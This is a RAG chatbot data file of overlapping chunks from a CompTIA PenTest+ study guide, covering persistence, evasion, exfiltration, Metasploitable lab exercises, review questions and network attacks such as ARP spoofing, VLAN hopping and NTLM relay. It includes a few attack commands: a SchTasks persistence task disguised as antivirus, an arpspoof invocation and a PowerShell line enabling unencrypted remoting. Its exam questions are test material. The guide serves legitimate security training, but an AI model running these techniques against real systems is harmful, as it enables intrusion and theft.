rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	data. Pentesters need to know the basics of how these can be enumerated and why each is an important target. Explain how to create a foothold and maintain persistence. Once you have access to a system, you need to create and maintain a foothold. That means using tools that can provide remote access like Trojans and backdoors that provide remote shell access. Other techniques like the use of daemons that run automatically at system startup and schedule tasks that put remote access back in place on a scheduled basis are also important for pentesters to be aware of. Knowing when each of these techniques is suited for a task and what benefits and limitations each has are important to be prepared for the exam. Demonstrate how to avoid detection. Detection avoidance techniques include the use of fileless malware that does not leave files or artifacts on the remote system and instead injects itself into running processes. Once you've gained access to a system, the next step is living off the land, which means using built‐in tools available on target systems instead of bringing tools along. Once access has been obtained, pentesters need to consider methods and tools for data exfiltration, including what techniques like the use of steganography and covert channels are best suited to different scenarios. Finally, covering your tracks involves cleaning up tools and data and ensuring that defenders have a harder time detecting or reverse‐engineering attacks. Understand how common penetration testing tools are used in a test. Pentesters need to be familiar with a broad range of tools. The PenTest+ exam outline specifically mentions SearchSploit, PowerSploit, Responder, the Impacket tools suite, Empire, Metasploit, mitm6, CrackMapExec, TruffleHog, and Censys as examples of tools that you should be aware of for the exam. Lab Exercises Activity 6.1: Exploit In this activity, you will exploit a Metasploitable 3 system. In order to run this lab, you must first build the Windows 2008 Metasploitable 3 virtual machine. Instructions for this can be found at https://github.com/rapid7/metasploitable3. If you are unable to successfully complete this, you can perform similar activities with Metasploitable 2. 1. Use OpenVAS (or another vulnerability scanner that you prefer) to scan the Metasploitable 3 system. 2. Review each of the high or critical vulnerabilities for potential exploit candidates. Take notes on which are likely candidates for exploit, and review them based on the CVE, BID, or other links provided in the vulnerability scanner. Note which vulnerabilities have exploits available based on this information. 3. Search for exploits via the Rapid7 Exploit Database at https://www.rapid7.com/db/modules. Identify the Metasploit modules that match the vulnerabilities you have found in steps 1 and 2. 4. Use Metasploit to exploit one or more of the vulnerabilities. Be sure to validate access to the remote system by checking the local directory, executing a command, or otherwise ensuring that you have a valid shell on the Windows 2008 system. 5. Record the method that you used to accomplish the exploit, including details of the exploit, the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	in the vulnerability scanner. Note which vulnerabilities have exploits available based on this information. 3. Search for exploits via the Rapid7 Exploit Database at https://www.rapid7.com/db/modules. Identify the Metasploit modules that match the vulnerabilities you have found in steps 1 and 2. 4. Use Metasploit to exploit one or more of the vulnerabilities. Be sure to validate access to the remote system by checking the local directory, executing a command, or otherwise ensuring that you have a valid shell on the Windows 2008 system. 5. Record the method that you used to accomplish the exploit, including details of the exploit, the remote host, the payload, and any other information you would need to repeat the exploit. Activity 6.2: Discovery In this section of the lab, you will use the compromised remote machine to identify other targets. 1. Clone your Windows 2008 Metasploitable system or load a copy of the Metasploitable 2 virtual machine, and start it. Ensure that the system boots and has a unique IP address by logging into it and verifying its IP address. 2. Using the compromised Windows 2008 virtual machine from Activity 6.1, determine how you could perform a port scan of the new instance. a. What built‐in tools or applications could you use in Windows 2008? b. What limitations would you encounter using this option? c. What PowerSploit modules would be useful for this exercise? d. Use the PowerSploit module you identified to perform a port scan of the new system and record the results. 3. Run a scan using Nmap from your Kali system and compare the results to the results you obtained in step 2d. What differences are visible? Activity 6.3: Pivot In this exercise, you will pivot to a second system. This exercise is best done with a partner who can help modify your target systems to challenge you during the pivot. 1. Set up your lab environment as in the previous exercises with a Kali penetration testing machine and a Metasploitable target, and then set up a second Metasploitable target machine. You may want to use Metasploitable 2 instead of 3 or set up a Metasploitable 3 Windows and a Metasploitable 3 Linux host. 2. If you are working with a partner, have them configure one of the systems using an IP address that you do not know, and have them configure the firewall to allow access only from the other Metasploitable system. They may also choose to disable some or many of the services presented by the Metasploitable system or to allow the firewall to block access to them on one or both systems, but they should leave at least one exploitable service intact for each system. 3. With your environment ready, scan and assess vulnerabilities on the initial Metasploitable system. Ensure that you cannot access the second system and cannot determine its IP address or hostname from the Kali Linux system. 4. Use the scan data to determine your exploit approach, and use Metasploit to compromise your target. 5. Once
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	system. They may also choose to disable some or many of the services presented by the Metasploitable system or to allow the firewall to block access to them on one or both systems, but they should leave at least one exploitable service intact for each system. 3. With your environment ready, scan and assess vulnerabilities on the initial Metasploitable system. Ensure that you cannot access the second system and cannot determine its IP address or hostname from the Kali Linux system. 4. Use the scan data to determine your exploit approach, and use Metasploit to compromise your target. 5. Once you have exploited the first target, use only the tools accessible on that system to find the second system. This may require you to use tools like ping or other built‐in commands to manually scan for the second system. 6. Once you have identified the second system, determine how you can scan it for vulnerabilities and compromise it. Remember that it is possible to create tunnels between systems that forward traffic, that tools like Meterpreter or Metasploit payloads can include useful utilities, and that you may want to use your access to the system to download a tool like Netcat. 7. This lab is complete when you have compromised the second system. Thank your partner! Review Questions You can find the answers in the Appendix A. 1. Alice discovers a rating that her vulnerability scanner lists as 9.3 out of 10 on its severity scale. The service that is identified runs on TCP 445. What type of exploit is Alice most likely to use on this service? A. SQL injection B. SMB exploit C. CGI exploit D. MIB exploit Use the following scenario for questions 2 through 4: Charles has recently completed a vulnerability scan of a system and needs to select the best vulnerability to exploit from the following listing: 2. Which of the entries should Charles prioritize from this list if he wants to gain access to the system? A. The Ruby on Rails vulnerability. B. The OpenSSH vulnerability. C. The MySQL vulnerability. D. None of these; he should find another target. 3. If Charles wants to build a list of additional system user accounts, which of the vulnerabilities is most likely to deliver that information? A. The Ruby on Rails vulnerability B. The OpenSSH vulnerability C. The MySQL vulnerability D. Both the OpenSSH and MySQL vulnerabilities 4. If Charles selects the Ruby on Rails vulnerability, which of the following methods cannot be used to search for an existing Metasploit vulnerability? A. CVE B. BID C. MSF D. EDB 5. Matt wants to pivot from a Linux host to other hosts in the network but is unable to install additional tools beyond those found on a typical Linux server. How can he leverage the system he is on to allow vulnerability scans of those remote hosts if they are firewalled against inbound connections and protected from direct access from his penetration testing workstation? A. SSH tunneling B. Netcat
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	If Charles selects the Ruby on Rails vulnerability, which of the following methods cannot be used to search for an existing Metasploit vulnerability? A. CVE B. BID C. MSF D. EDB 5. Matt wants to pivot from a Linux host to other hosts in the network but is unable to install additional tools beyond those found on a typical Linux server. How can he leverage the system he is on to allow vulnerability scans of those remote hosts if they are firewalled against inbound connections and protected from direct access from his penetration testing workstation? A. SSH tunneling B. Netcat port forwarding C. Enable IPv6 D. Modifying browser plug‐ins 6. After gaining access to a Windows system, Fred uses the following command: SchTasks /create /SC Weekly /TN "Antivirus" /TR "C:\Users\SSmith\av.exe" /ST 09:00 What has he accomplished? A. He has set up a weekly antivirus scan. B. He has set up a job called “weekly.” C. He has scheduled his own executable to run weekly. D. Nothing; this command will only run on Linux. 7. After gaining access to a Linux system through a vulnerable service, Cassandra wants to list all of the user accounts on the system and their home directories. Which of the following locations will provide this list? A. /etc/shadow B. /etc/passwd C. /var/usr D. /home 8. A few days after exploiting a target with the Metasploit Meterpreter payload, Robert loses access to the remote host. A vulnerability scan shows that the vulnerability that he used to exploit the system originally is still open. What has most likely happened? A. A malware scan discovered Meterpreter and removed it. B. The system was patched. C. The system was rebooted. D. Meterpreter crashed. 9. Angela wants to exfiltrate data from a Windows system she has gained access to during a penetration test. Which of the following exfiltration techniques is least likely to be detected? A. Send it via outbound HTTP as plain text to a system she controls. B. Hash the data, then send the hash via outbound HTTPS. C. Use PowerShell to base64‐encode the data, then post to a public HTTPS‐accessible code repository. D. Use PowerShell to base64‐encode the data, then use an SSH tunnel to transfer the data to a system she controls. 10. Ian's penetration test rules of engagement specify that he cannot add tools to the systems he compromises in a specific target environment. What techniques will he have to use to meet this requirement? A. Compromise using a fileless malware package, then cover his tracks and clean up any files he uses. B. Compromise using a known exploit and dropper from Metasploit, then use living‐off‐the‐land techniques. C. Compromise using a fileless malware package, then use living‐ off‐the‐land techniques. D. Compromise using a known exploit and dropper from Metasploit, then clean up the dropped files and only use system utilities for further work. 11. Tina has acquired a list of valid user accounts but does not have passwords for them. If she has not found any
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	will he have to use to meet this requirement? A. Compromise using a fileless malware package, then cover his tracks and clean up any files he uses. B. Compromise using a known exploit and dropper from Metasploit, then use living‐off‐the‐land techniques. C. Compromise using a fileless malware package, then use living‐ off‐the‐land techniques. D. Compromise using a known exploit and dropper from Metasploit, then clean up the dropped files and only use system utilities for further work. 11. Tina has acquired a list of valid user accounts but does not have passwords for them. If she has not found any vulnerabilities but believes that the organization she is targeting has poor password practices, what type of attack can she use to try to gain access to a target system where those usernames are likely valid? A. Rainbow tables B. Dictionary attacks C. Thesaurus attacks D. Meterpreter 12. What built‐in Windows server administration tool can allow command‐line PowerShell access from other systems? A. VNC B. PowerSSHell C. PSRemote D. RDP 13. John wants to retain access to a Linux system. Which of the following is not a common method of maintaining persistence on Linux servers? A. Scheduled tasks B. cron jobs C. Trojaned services D. Modified daemons 14. Tim has selected his Metasploit exploit and set his payload as cmd/unix/generic. After attempting the exploit, he receives the following output. What went wrong? A. The remote host is firewalled. B. The remote host is not online. C. The host is not routable. D. The remote host was not set. 15. Cameron runs the following command via an administrative shell on a Windows system he has compromised. What has he accomplished? $command = 'cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True;Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force' A. He has enabled PowerShell for local users. B. He has set up PSRemoting. C. He has disabled remote command‐line access. D. He has set up WSMan. 16. Mike discovers a number of information exposure vulnerabilities while preparing for the exploit phase of a penetration test. If he has not been able to identify user or service information beyond vulnerability details, what priority should he place on exploiting them? A. High priority; exploit early. B. Medium priority; exploit after other system and service exploits have been attempted. C. Low priority; only exploit if time permits. D. Do not exploit; information exposure exploits are not worth conducting. 17. Annie is using a collection of leaked passwords to attempt to log in to multiple user accounts belonging to staff of the company she is penetration testing. The tool she is using attempts to log into each account using a single password, then moves on to the next password, recording failures and successes. What type of attack is Annie conducting? A. A firehose attack B. Password spraying C. Pass the hash D. A cloned password attack 18. Jacob wants to capture user hashes on a Windows network. Which tool could he select to gather these from broadcast messages?
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	conducting. 17. Annie is using a collection of leaked passwords to attempt to log in to multiple user accounts belonging to staff of the company she is penetration testing. The tool she is using attempts to log into each account using a single password, then moves on to the next password, recording failures and successes. What type of attack is Annie conducting? A. A firehose attack B. Password spraying C. Pass the hash D. A cloned password attack 18. Jacob wants to capture user hashes on a Windows network. Which tool could he select to gather these from broadcast messages? A. Metasploit B. Responder C. Impacket D. Wireshark 19. Madhuri has been asked to run BloodHound as part of her penetration testing efforts. What will she be able to do with the tool? A. Visualize Active Directory environments. B. Capture encrypted network traffic. C. Visualize network traffic flows. D. Find encrypted files in network share drives. 20. Ben is performing a penetration test as part of a PCI DSS engagement. What technique is he most likely to use as part of network segmentation testing? A. Testing for 802.1q trunking on the Internet connection B. Testing for physical segmentation of networks C. Firewall rule validation between segments D. Antimalware rule validation between segments Chapter 7 Exploiting Network Vulnerabilities THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 3: Vulnerability Discovery and Analysis 3.1 Given a scenario, conduct vulnerability discovery using various techniques. Wireless Service set identifier (SSID) scanning Channel scanning Signal strength scanning Domain 4: Attacks and Exploits 4.2 Given a scenario, perform network attacks using the appropriate tools. Attack types Default credentials On‐path attack Certificate services Misconfigured services exploitation Virtual local area network (VLAN) hopping Multihomed hosts Segmentation bypass Relay attack Share enumeration Packet crafting Tools Metasploit Netcat Nmap NSE Impacket CrackMapExec (CME) Wireshark/tcpdump MSFVenom Responder Hydra 4.7 Given a scenario, perform wireless attacks using the appropriate tools. Attacks Wardriving Evil twin attack Signal jamming Protocol fuzzing Packet crafting Deauthentication Captive portal Wi‐Fi Protected Setup (WPS) personal identification number (PIN) attack Tools WAPD WiFi‐Pumpkin Aircrack‐ng WiGLE.net InSSIDer Kismet Network attacks come in many forms. Some focus on protocol vulnerabilities or take advantage of specific configurations. Others seek to obtain access to the network or to persuade target systems that they are legitimate servers or the correct network path to send traffic through to allow on‐path attacks. In this chapter, we will explore many of these vulnerabilities and the tools and techniques that can be used to exploit them. Along the way, we will dive into Microsoft Windows network vulnerabilities; attacks against common network services like SMTP, FTP, and DNS, and both wired and wireless network attacks. Our scenario continues in this chapter with an on‐site penetration test that focuses on acquiring network access and then leveraging that access to penetrate systems that were not accessible from outside the network's security boundary. You will learn how to set up a fake wireless access point and how to gather information
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	chapter, we will explore many of these vulnerabilities and the tools and techniques that can be used to exploit them. Along the way, we will dive into Microsoft Windows network vulnerabilities; attacks against common network services like SMTP, FTP, and DNS, and both wired and wireless network attacks. Our scenario continues in this chapter with an on‐site penetration test that focuses on acquiring network access and then leveraging that access to penetrate systems that were not accessible from outside the network's security boundary. You will learn how to set up a fake wireless access point and how to gather information about wireless and wired clients and traffic in order to help you gain access to your target. Once you have access to the network, you will work to gain further access, including access to credentials and data exposed by service exploits. Real World Scenario Scenario Part 1: On‐site Assessment After your successful remote penetration test of MCDS, LLC, the firm has asked you to perform an on‐site assessment of its network security. MCDS operates a facility with over 500 employees in your area, with four office buildings spread across a small corporate campus. You must determine how to gain access to its network and then pivot to gain credentials that are useful in its infrastructure. From your previous data gathering, you know that MCDS runs an infrastructure that uses both a Windows 2012 Active Directory domain and quite a few Linux servers that provide web and other services both internally and externally. As you read this chapter, consider how you would answer the following questions: 1. How would you gain access to the MCDS wired network if it uses a NAC scheme based on a MAC address? 2. What would you do differently if the NAC system used a client‐ based approach? 3. MCDS uses an 802.11ac network, with an open guest network called MCDS_GUEST and a WPA‐2 Enterprise network that authenticates via RADIUS to Active Directory for its own internal users. How would you gather information about these networks and the systems that use them? 4. What attacks could you use against the wired network once you gain access? Identifying Exploits One of the first things you'll need to have in hand once you've identified a network that you want to attack is an exploit to leverage. The PenTest+ exam outline includes two specific sites where that sort of information and the exploit code itself can often be found: Exploit DB, which provides a searchable database of exploits sorted by type, platform, and CVE information. You can find it at www.exploitdb.com. Packet Storm, found at https://packetstormsecurity.com, includes news as well as exploit information and code. These aren't the only exploit databases out there. We covered others in Chapter 6, “Exploit and Pivot,” but you'll want to have these specifically in mind as you prepare for this part of the PenTest+ exam. Conducting Network Exploits Once you have gained access to one or more systems at a target location, or
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	information and the exploit code itself can often be found: Exploit DB, which provides a searchable database of exploits sorted by type, platform, and CVE information. You can find it at www.exploitdb.com. Packet Storm, found at https://packetstormsecurity.com, includes news as well as exploit information and code. These aren't the only exploit databases out there. We covered others in Chapter 6, “Exploit and Pivot,” but you'll want to have these specifically in mind as you prepare for this part of the PenTest+ exam. Conducting Network Exploits Once you have gained access to one or more systems at a target location, or if you have obtained physical or wireless network access, you should consider how you can exploit the network itself. This can involve attacking network protocols and behaviors, conducting on‐path attacks to capture traffic that you wouldn't normally be able to see, using denial‐of‐service (DoS) attacks to disable services or systems, or conducting attacks against security controls like NAC or encryption. As part of the PenTest+ subdomain 4.2, you will need to know how to use specific techniques and tools when given a scenario. Many of these will revolve around performing network attacks using the appropriate tools and require you to understand not only what is being done, but how it relates to conducting a penetration test. First, let's begin by examining specific attack types you will need to know about. Default Credentials When conducting exploits, the most often used method of penetration is by logging into a system. Most systems have backdoors, ways to access and probe and poke into the system, but there is always the front door, which is usually the default login method. Logging into network systems and devices such as routers, switches, firewalls, access points, and other infrastructure generally has an “out‐of‐the‐box” way to do so in the form of default credentials. Default credentials are just that, the default username and password that comes with the device to enable the first login so you can configure it for use. Most of the default credentials can be found on the dark web or in lists online. They are put into tools or tried manually, and can give access to systems rather quickly when not changed from their defaults. Although most times seasoned administrators know how to change the default username and password, they are still found often out in the wild and exploited. Another common form of default credentials is half of the equation, which is the username. Many times, the username that comes with the system remains the same, which gives an attacker half of what they need to begin an attack. Because the username is left as its default, all an attacker needs to do is use a myriad of password attacks to get access. There are two methods to thwart this, which is to first use named accounts (not generic ones named Administrator) as an example and tied back to an active user on your network. So, if Joe Smith is the administrator, then
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	default credentials is half of the equation, which is the username. Many times, the username that comes with the system remains the same, which gives an attacker half of what they need to begin an attack. Because the username is left as its default, all an attacker needs to do is use a myriad of password attacks to get access. There are two methods to thwart this, which is to first use named accounts (not generic ones named Administrator) as an example and tied back to an active user on your network. So, if Joe Smith is the administrator, then the account JoeS is given administrator rights. This also allows you to log the username specifically, which can be helpful in audits. Another method to solve this problem is to set up a honeypot, which involves leaving the account as is but removing all privileges from it, auditing and logging it heavily, and seeing if the account is “tried” for any reason. This could tip the hat so you can see if someone is attempting to hack you or your network and systems. Certificate Services The certificates that an organization's websites present can be enumerated as part of an information‐gathering effort. Nmap can gather certificate information using the ssl‐cert NSE script as an example, and all major vulnerability scanners can grab and validate certificate information. As you might expect, web application vulnerability scanners also specifically build in this capability. Knowing what certificates are in use, and if they are expired, revoked, or otherwise problematic, can be useful to a pentester because out‐of‐date certificates and other cryptographic flaws often point to other administrative or support issues that may be exploited. These same exploits can lead to network exploitation. Certificates are also used for users and services and may be acquired during later stages of a penetration test. User and service certificates and keys are typically tracked as they are acquired rather than directly enumerated. VLAN Hopping Virtual local area networks (VLANs) separate broadcast domains into sections for security or performance reasons. Many organizations use VLANs to create internal security boundaries between different systems or organizational units. This makes the ability to access a VLAN other than the one you are currently on an attractive opportunity for pentesters. There are two common means of conducting VLAN hopping attacks: double tagging and switch spoofing. Double tagging is used on 802.1Q trunked interfaces. Figure 7.1 shows the internal layout of an 802.1ad Ethernet frame that allows the second VLAN tag to be inserted into the packet. This enables the outer tag or service provider tag found immediately after the source MAC address to be read first and then the inner, or customer, tag to be read second. FIGURE 7.1 Double‐tagged Ethernet packet Pentesters can use double tagging to hop VLANs by inserting the native VLAN's tag as the first tag and the target VLAN's tag as the second tag. This causes the packet to be passed by switches on its native VLAN, with the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	7.1 shows the internal layout of an 802.1ad Ethernet frame that allows the second VLAN tag to be inserted into the packet. This enables the outer tag or service provider tag found immediately after the source MAC address to be read first and then the inner, or customer, tag to be read second. FIGURE 7.1 Double‐tagged Ethernet packet Pentesters can use double tagging to hop VLANs by inserting the native VLAN's tag as the first tag and the target VLAN's tag as the second tag. This causes the packet to be passed by switches on its native VLAN, with the next switch on its trip reading the second tag. As a result, the packet is sent to the target VLAN, since it looks like it originated on the correct source VLAN. Double tagging does have a couple of critical flaws that limit its use for pentesters. First, since the VLAN tags won't be replicated on responses, no responses will be received by the originating system. Second, double tagging can only be used when switches are configured to allow native VLANs, and many organizations use mitigation techniques to prevent this type of abuse. 802.1Q trunking (or Dot1q) allows VLANs to work by adding tags to Ethernet frames. Switches and other devices then interpret those tags, allowing the traffic to be handled as part of the virtual LAN. Double tagging is an important capability for Internet service providers who want to properly handle VLAN tagging done by their clients while using their own VLAN tagging, so the ability to do double tagging isn't uncommon. Switch spoofing relies on making the attacking host act like a trunking switch. Because the host then appears to be a switch that allows trunks, it can view traffic sent to other VLANs. Like double tagging, this technique requires that local network devices be configured to allow the attacking host to negotiate trunks (with an interface set to dynamic desirable, dynamic auto, or trunk mode), which should not be the case in a well‐configured and well‐maintained network. If you gain control of network devices or discover a misconfigured or poorly maintained and managed network, switch spoofing can provide additional visibility into VLANs that might otherwise remain hidden. Attacks like these can be performed using the Yersinia tool found in Kali Linux. Yersinia provides a wide range of layer 2 attack capabilities, including Spanning Tree Protocol (STP) attacks, Dynamic Host Configuration Protocol (DHCP) attacks, 802.1Q trunking attacks, and quite a few others. Figure 7.2 shows Yersinia's attack module selection and interface. FIGURE 7.2 Yersinia 802.1q attack selection The PenTest+ exam objectives don't cover Yersinia, so you shouldn't have to practice with it, but if you need these capabilities, you'll want to know that it exists. DNS Cache Poisoning DNS spoofing, also known as DNS cache poisoning, can allow you to redirect traffic to a different host that you control. As shown in Figure 7.3, a poisoned DNS entry will point traffic to the wrong IP address, allowing attackers to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Host Configuration Protocol (DHCP) attacks, 802.1Q trunking attacks, and quite a few others. Figure 7.2 shows Yersinia's attack module selection and interface. FIGURE 7.2 Yersinia 802.1q attack selection The PenTest+ exam objectives don't cover Yersinia, so you shouldn't have to practice with it, but if you need these capabilities, you'll want to know that it exists. DNS Cache Poisoning DNS spoofing, also known as DNS cache poisoning, can allow you to redirect traffic to a different host that you control. As shown in Figure 7.3, a poisoned DNS entry will point traffic to the wrong IP address, allowing attackers to redirect traffic to a system of their choice. Most DNS cache poisoning relies on vulnerabilities in DNS software, but improperly secured or configured DNS servers can allow attackers to present DNS information without proper validation. FIGURE 7.3 DNS cache poisoning attack The most famous DNS cache poisoning vulnerability was announced in 2008, and it is rare to find a vulnerable DNS server now. Thus, DNS poisoning attacks that rely on very narrow, difficult‐to‐exploit timing attack windows are the main option for attackers. Unless a new, widespread DNS vulnerability is discovered, DNS cache poisoning attacks are unlikely to be usefully exploitable for most pentesters. If you want to read up on Dan Kaminsky's 2008 DNS vulnerability, Steve Friedl provides a great illustrated guide at http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html, and you can read the CERT vulnerability note at https://www.kb.cert.org/vuls/id/800113. Pentesters can take advantage of related techniques, including modifying the local hosts file on compromised systems to resolve hostnames to specified IP addresses. Although this will not impact an entire network, the effect at a single system level is the same as it would be for a poisoned DNS cache. A final option for pentesters is to modify the actual DNS server for a network. If you can gain control of an organization's DNS servers, or cause systems to point to a different DNS server, you can arbitrarily choose where DNS entries send your victims. CompTIA has put significant effort into removing gendered and noninclusive terms from its exams and exam outlines. That means you may see some terms on the exam that you're not used to from other materials or your existing experience. Make sure you pay attention to the terms CompTIA is using so that you know what you're answering a question about! On‐Path Attacks Pentesters often want to capture traffic that is sent to or from a target system. Unfortunately, without control of the network devices along the path, they cannot access that traffic in most cases on a modern switched network. That means they need to find a way to insert themselves into the middle of the traffic flow, either by persuading the systems involved to send traffic via another path or by compromising network equipment that is in the path of the target traffic. This type of attack is frequently called an on‐ path, or adversary‐in‐the‐middle attack. ARP Spoofing and Poisoning The Address Resolution Protocol (ARP) is used to map IP
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to or from a target system. Unfortunately, without control of the network devices along the path, they cannot access that traffic in most cases on a modern switched network. That means they need to find a way to insert themselves into the middle of the traffic flow, either by persuading the systems involved to send traffic via another path or by compromising network equipment that is in the path of the target traffic. This type of attack is frequently called an on‐ path, or adversary‐in‐the‐middle attack. ARP Spoofing and Poisoning The Address Resolution Protocol (ARP) is used to map IP addresses to physical machine addresses (MAC, or Media Access Control, addresses). Since systems rely on ARP to identify other systems on their local network, falsifying responses to ARP queries about which address traffic should be sent to can allow attackers to conduct various attacks that rely on victims sending their traffic to the wrong system, including on‐path attacks. ARP spoofing occurs when an attacker sends falsified ARP messages on a local network, thus providing an incorrect MAC address–to–IP address pairing for the deceived system or systems. This information is written to the target machine's ARP cache, and the attacker can then either intercept or capture and forward traffic. If on‐path packet capture isn't your goal, the same technique can be used to hijack sessions or cause additional traffic to hit a target system, potentially causing a DoS condition. In Figure 7.4, an attacker has conducted an ARP spoofing attack, causing machine A to believe that machine M should receive traffic meant for machine B. Machine M now acts as a proxy and inspects all the traffic that machine B receives, often without either A or B becoming aware that traffic is not flowing as it should. FIGURE 7.4 ARP spoofing ARP spoofing only works on local networks, which means that you will need to be inside the broadcast domain for a target system to successfully spoof a response. Conducting this attack in Kali Linux is relatively simple using the arpspoof command, where eth0 is our local interface, the target is set with ‐t, and the router or other upstream device is set using the ‐r flag for the host: arpspoof -i eth0 -t 10.0.2.7 -r 10.0.2.1 The reverse spoof can also be set up to allow responses to be captured, and tools like Wireshark can be used to monitor traffic between the two hosts. As you might expect, Metasploit includes ARP poisoning tools in its auxiliary modules (auxiliary/spoof/arp/arp_poisoning). Defenders may have implemented ARP spoofing detection tools, either using automated detection capabilities or simply via Wireshark. Using an active technique that may be caught by defenders may be dangerous, so the value of an attack like this should always be weighed against the likelihood of detection. MAC Address Spoofing Devices identify themselves on networks using their hardware or Media Access Control (MAC) address. From a pentester's perspective, being able to use the MAC address of another system can be a powerful
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	between the two hosts. As you might expect, Metasploit includes ARP poisoning tools in its auxiliary modules (auxiliary/spoof/arp/arp_poisoning). Defenders may have implemented ARP spoofing detection tools, either using automated detection capabilities or simply via Wireshark. Using an active technique that may be caught by defenders may be dangerous, so the value of an attack like this should always be weighed against the likelihood of detection. MAC Address Spoofing Devices identify themselves on networks using their hardware or Media Access Control (MAC) address. From a pentester's perspective, being able to use the MAC address of another system can be a powerful tool. You can use MAC address spoofing to bypass network access controls, captive portals, and security filters that rely on a system's MAC to identify it. You can also use it as part of on‐path and other attacks that rely on systems thinking they're sending traffic to a legitimate host. MAC address spoofing can be quite simple. Figure 7.5 shows how MAC addresses can be manually set from the Advanced tab for your network adapter. FIGURE 7.5 Manually configuring a MAC address in Windows 10 It can be tempting to set a clever MAC address that uses hexadecimal to spell out words, but in most cases you'll be using MAC addresses that belong to legitimate systems that you are attempting to spoof. Replay Attacks A replay attack is a form of on‐path attack that focuses on capturing and then re‐sending data. Common uses for replay attacks include masquerading to allow an attacker to present credentials to a service or system after capturing them during an authentication process. Replay attacks are covered in more depth in Chapter 9, “Exploiting Application Vulnerabilities,” where we talk about them as part of application vulnerabilities. One of the most common replay attacks used by pentesters is an NTLM pass‐the‐hash attack. Once a pentester has acquired NTLM hashes, they can then identify systems that do not require SMB signing (which prevents the attack). With a list of targets in hand, Responder or other tools with similar features can be used to intercept authentication attempts, and then an NTLM relay tool can be leveraged to drop Empire or another similar tool onto the target machine. if you'd like to read a good overview of how to conduct this attack, including leaving the target with Empire running, you can find an excellent write‐up here: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017aka-getting-a-foothold-in-under-5-minutes.html Replay attacks are increasingly harder to conduct now that many services use encrypted protocols for data interchange. As a pentester, you may have to take additional steps to successfully conduct a replay attack. Wireshark and tcpdump are great tools to help create the ability for a replay attack. First, tools such as these are used to capture and analyze packets on a network. For example, if you want to use Wireshark, you can install it on your system and run the application that puts your network interface card (NIC) in promiscuous mode, which allows it to pick up and collect all evidence of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	increasingly harder to conduct now that many services use encrypted protocols for data interchange. As a pentester, you may have to take additional steps to successfully conduct a replay attack. Wireshark and tcpdump are great tools to help create the ability for a replay attack. First, tools such as these are used to capture and analyze packets on a network. For example, if you want to use Wireshark, you can install it on your system and run the application that puts your network interface card (NIC) in promiscuous mode, which allows it to pick up and collect all evidence of traffic passing it. It will then record that information and show it in the application itself so that you can see the types of traffic being sent as well as specific information found within the packets such as IP addresses, ports numbers, and so much more. The other tool, tcpdump, is an older Unix (and Linux)‐based form of Wireshark. Both tools work similarly, but Wireshark is focused more on a GUI, whereas tcpdump is command line based. Both tools can be used to capture and analyze network traffic. Other tools that can also be used for replay attacks are Scapy and tcpreplay. For the PenTest+ exam, you will need to know about packet crafting. Packet crafting is a technique that allows you to create packets from scratch with tools like Scapy. Since packets are sent to and from source to destination from network devices, consider creating a malicious packet and injecting it into the network to exploit vulnerable systems. Pentesters can forge traffic in order to test systems for vulnerabilities and determine if they are exploitable. You can test firewalls, access control lists (ACLs), and ports on systems. Learn more about creating packets with Scapy here: https://0xbharath.github.io/art-of-packet-crafting-withscapy/scapy/creating_packets/index.html Relay Attacks Relay attacks can appear very similar to other on‐path attacks; however, in relay attacks, the on‐path system is used only to relay attacks without modifying them rather than modifying any traffic. Bear in mind that relay attacks are not limited to traditional IP‐based network traffic. As a pentester, you may find it useful to query an RFID card or other device required to provide authentication or authorization and to relay the response to a device or system that the card is not actually near! The same tools used to execute other on‐path attacks can be used for relay attacks, since the goal is merely to capture or present traffic rather than modify it. NTLM relay attacks are simply a specific example of relay attacks. So applying this concept to NTLM traffic is an appropriate way to think about NTLM relay attacks. NAC Bypass Although many network attacks rely on on‐path techniques to access traffic, gaining access to a network itself may also be required. Many organizational networks now require authentication and authorization to be on the network, and network access control (NAC) is often used to provide that security layer. NAC systems work by detecting when new devices connect to a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	goal is merely to capture or present traffic rather than modify it. NTLM relay attacks are simply a specific example of relay attacks. So applying this concept to NTLM traffic is an appropriate way to think about NTLM relay attacks. NAC Bypass Although many network attacks rely on on‐path techniques to access traffic, gaining access to a network itself may also be required. Many organizational networks now require authentication and authorization to be on the network, and network access control (NAC) is often used to provide that security layer. NAC systems work by detecting when new devices connect to a network and then requiring them to be authorized to access the network. Their detection process typically involves one of the following methods: A software client that talks to a NAC server when connected A DHCP proxy that listens for traffic like DHCP requests A broadcast listener that looks for broadcast traffic like ARP queries or a more general‐purpose sniffer that looks at other IP packets An SNMP‐trap‐based approach that queries switches to determine when a new MAC address shows up on one of their connected ports A pentester who wants to bypass NAC needs to determine what detection method the NAC system in place on a target network is using and can then use that information to figure out how they can best attempt to bypass NAC. Systems that do not require client software and instead rely on information like the MAC address of a device can sometimes be bypassed by presenting a cloned MAC address on the same port that an existing system was connected on. Similarly, DHCP proxies can be bypassed by using a static IP address that the network already trusts. Kali Linux provides the tool macchanger, an easy way to change the MAC address of a Kali system, including the ability to match known vendor MAC prefixes as well as set either 